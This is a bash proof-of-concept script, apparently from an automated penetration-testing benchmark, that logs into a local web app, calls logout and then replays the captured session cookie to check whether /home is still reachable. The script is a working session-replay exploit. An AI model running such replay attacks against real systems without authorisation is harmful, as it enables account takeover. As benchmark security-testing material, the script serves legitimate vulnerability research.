#!/bin/bash
# POC: Demonstrates that a session cookie can still be used to access protected resources after logout, even though the server sends Set-Cookie headers instructing the browser to clear it. This proves incomplete server-side session invalidation.
# Target: ./repo
# Created: 2025-11-07T18:18:54.988Z
# Session: benchmark-XBEN-022-24-mhp5xc5o

# Session Invalidation Bypass POC - Version 2
# Demonstrates that cleared session cookies can still be used to access protected resources

TARGET_URL="${1:-http://localhost:80}"

echo "=========================================="
echo "Session Invalidation Bypass POC v2"
echo "=========================================="
echo "Target: $TARGET_URL"
echo ""

# Step 1: Login and capture session cookie (follow redirects)
echo "[*] Step 1: Logging in to capture session cookie..."
TEMP_COOKIES="/tmp/cookies_$RANDOM.txt"

# Login with redirect following
curl -s -L -c "$TEMP_COOKIES" -X POST "$TARGET_URL/login" \
  -d "username=test&password=test" \
  -H "Content-Type: application/x-www-form-urlencoded" > /dev/null

# Extract session cookie
SESSION_COOKIE=$(grep "session" "$TEMP_COOKIES" | awk '{print $7}')

if [ -z "$SESSION_COOKIE" ]; then
  echo "[-] Failed to capture session cookie"
  echo "[-] Cookie file contents:"
  cat "$TEMP_COOKIES"
  rm -f "$TEMP_COOKIES"
  exit 1
fi

echo "[+] Session cookie captured: $SESSION_COOKIE"
echo ""

# Step 2: Verify session is valid before logout
echo "[*] Step 2: Verifying session is valid before logout..."
PROTECTED_RESPONSE=$(curl -s -H "Cookie: session=$SESSION_COOKIE" "$TARGET_URL/home")

if echo "$PROTECTED_RESPONSE" | grep -q -i "welcome\|john\|dashboard\|profile"; then
  echo "[+] Session is valid - protected resource accessible"
  echo "[+] Response preview: $(echo "$PROTECTED_RESPONSE" | grep -o -i "welcome.*" | head -c 80)"
else
  echo "[-] Protected resource not accessible before logout"
  echo "[-] Response: $(echo "$PROTECTED_RESPONSE" | head -c 200)"
  rm -f "$TEMP_COOKIES"
  exit 1
fi
echo ""

# Step 3: Perform logout
echo "[*] Step 3: Calling logout endpoint..."
LOGOUT_RESPONSE=$(curl -s -v -H "Cookie: session=$SESSION_COOKIE" "$TARGET_URL/logout" 2>&1)

# Check for Set-Cookie clear directive
if echo "$LOGOUT_RESPONSE" | grep -q "Set-Cookie.*Max-Age=0\|Set-Cookie.*Expires=Thu"; then
  echo "[+] Server sent Set-Cookie with clear directive"
else
  echo "[!] Warning: No explicit clear directive found"
fi

echo "[+] Logout response received"
echo ""

# Step 4: Attempt to use cleared session cookie after logout
echo "[*] Step 4: Attempting to access protected resource AFTER logout..."
echo "[*] Using same session cookie: $SESSION_COOKIE"
echo ""

BYPASS_RESPONSE=$(curl -s -H "Cookie: session=$SESSION_COOKIE" "$TARGET_URL/home")

if echo "$BYPASS_RESPONSE" | grep -q -i "welcome\|john\|dashboard\|profile"; then
  echo "[!] =========================================="
  echo "[!] VULNERABILITY CONFIRMED"
  echo "[!] =========================================="
  echo "[+] Session is STILL VALID after logout!"
  echo "[+] Protected resource returned HTTP 200 with content:"
  echo "$BYPASS_RESPONSE" | head -c 300
  echo ""
  echo ""
  echo "[!] SECURITY IMPACT: Session was not invalidated server-side"
  rm -f "$TEMP_COOKIES"
  exit 0
elif echo "$BYPASS_RESPONSE" | grep -q -i "login\|unauthorized\|forbidden\|401\|403"; then
  echo "[-] Session appears to be properly invalidated"
  echo "[-] User was redirected to login"
  rm -f "$TEMP_COOKIES"
  exit 1
else
  echo "[-] Unable to determine session validity"
  echo "[-] Response: $BYPASS_RESPONSE"
  rm -f "$TEMP_COOKIES"
  exit 1
fi